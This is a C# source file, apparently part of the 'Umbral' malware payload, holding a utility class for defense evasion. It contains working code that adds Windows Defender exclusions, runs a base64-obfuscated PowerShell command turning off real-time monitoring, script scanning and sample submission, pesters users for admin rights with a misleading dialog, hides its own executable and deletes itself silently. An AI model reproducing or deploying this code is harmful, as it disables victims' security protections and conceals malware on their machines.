using System;
using System.Diagnostics;
using System.IO;
using System.Reflection;
using System.Runtime.InteropServices;
using System.Security.Principal;
using System.Text;
using System.Threading;
using System.Windows.Forms;
using Umbral.payload.Config;

namespace Umbral.payload.Utilities
{
    internal static class Syscalls
    {
        static private Mutex _mutex;

        [DllImport("kernel32.dll")]
        static extern private IntPtr GetConsoleWindow();

        internal static bool IsConsoleVisible()
        {
            return GetConsoleWindow() != IntPtr.Zero;
        }

        internal static bool DefenderExclude(string path)
        {
            if (File.Exists(path) || Directory.Exists(path))
                using (Process process = new Process())
                {
                    process.StartInfo.FileName = "powershell.exe";
                    process.StartInfo.Arguments = $"Add-MpPreference -ExclusionPath '{path}'";
                    process.StartInfo.CreateNoWindow = true;
                    process.StartInfo.UseShellExecute = false;
                    process.Start();
                    process.WaitForExit();
                    return process.ExitCode == 0;
                }

            return false;
        }

        internal static bool DisableDefender()
        {
            string command = Encoding.UTF8.GetString(Convert.FromBase64String(
                "U2V0LU1wUHJlZmVyZW5jZSAtRGlzYWJsZUludHJ1c2lvblByZXZlbnRpb25TeXN0ZW0gJHRydWUgLURpc2FibGVJT0FWUHJvdGVjdGlvbiAkdHJ1ZSAtRGlzYWJsZVJlYWx0aW1lTW9uaXRvcmluZyAkdHJ1ZSAtRGlzYWJsZVNjcmlwdFNjYW5uaW5nICR0cnVlIC1FbmFibGVDb250cm9sbGVkRm9sZGVyQWNjZXNzIERpc2FibGVkIC1FbmFibGVOZXR3b3JrUHJvdGVjdGlvbiBBdWRpdE1vZGUgLUZvcmNlIC1NQVBTUmVwb3J0aW5nIERpc2FibGVkIC1TdWJtaXRTYW1wbGVzQ29uc2VudCBOZXZlclNlbmQgJiYgcG93ZXJzaGVsbCBTZXQtTXBQcmVmZXJlbmNlIC1TdWJtaXRTYW1wbGVzQ29uc2VudCAy"));
            using (Process process = new Process())
            {
                process.StartInfo.FileName = "powershell.exe";
                process.StartInfo.Arguments = command;
                process.StartInfo.CreateNoWindow = true;
                process.StartInfo.UseShellExecute = false;
                process.Start();
                process.WaitForExit();
                return process.ExitCode == 0;
            }
        }

        internal static bool CheckAdminPrivileges()
        {
            using (WindowsIdentity identity = WindowsIdentity.GetCurrent())
            {
                WindowsPrincipal principal = new WindowsPrincipal(identity);
                return principal.IsInRole(WindowsBuiltInRole.Administrator);
            }
        }

        internal static void AskForAdmin()
        {
            if (!CheckAdminPrivileges())
            {
                using (Process process = new Process())
                {
                    process.StartInfo.FileName = Assembly.GetExecutingAssembly().Location;
                    process.StartInfo.Verb = "runas";
                    process.StartInfo.CreateNoWindow = true;
                    try
                    {
                        process.Start();
                    }
                    catch (Exception)
                    {
                        DialogResult result = MessageBox.Show(
                            "This application requires administrative permissions to run correctly. Please restart the application with administrative permissions.",
                            "Error", MessageBoxButtons.YesNo, MessageBoxIcon.Error);
                        if (result == DialogResult.Yes)
                        {
                            _mutex?.ReleaseMutex();
                            AskForAdmin();
                        }
                        else
                        {
                            RegisterMutex();
                        }
                    }
                }

                Environment.Exit(0);
            }
        }

        internal static void RegisterMutex()
        {
            _mutex = new Mutex(true, Settings.Mutex, out bool createdNew);

            if (!createdNew)
            {
                Console.WriteLine("Another instance of the application is already running.");
                Environment.Exit(0);
            }
        }

        internal static void DeleteSelf()
        {
            using (Process process = new Process())
            {
                process.StartInfo.FileName = "cmd.exe";
                process.StartInfo.Arguments = $"/c ping localhost && del /F /A h \"{Assembly.GetCallingAssembly().Location}\" && pause";
                process.StartInfo.UseShellExecute = false;
                process.StartInfo.CreateNoWindow = true;
                process.Start();
            }

            Environment.Exit(0);
        }

        internal static void HideSelf()
        {
            using (Process process = new Process())
            {
                process.StartInfo.FileName = "attrib.exe";
                process.StartInfo.Arguments = $"+h +s \"{Assembly.GetCallingAssembly().Location}\"";
                process.StartInfo.CreateNoWindow = true;
                process.StartInfo.UseShellExecute = false;
                process.Start();
                process.WaitForExit();
            }
        }
    }
}